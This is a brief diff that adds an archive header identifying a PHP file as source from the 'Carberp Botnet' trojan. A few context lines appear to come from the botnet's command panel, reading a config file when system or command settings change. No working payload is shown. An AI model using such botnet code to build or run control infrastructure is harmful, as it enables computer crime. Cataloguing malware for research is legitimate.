@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 
 if(!empty($delete_sys) || !empty($add_sys) || !empty($save_cmd)){
 	$cfg = json_decode(file_get_contents($dir . 'cache/config.json'), true);
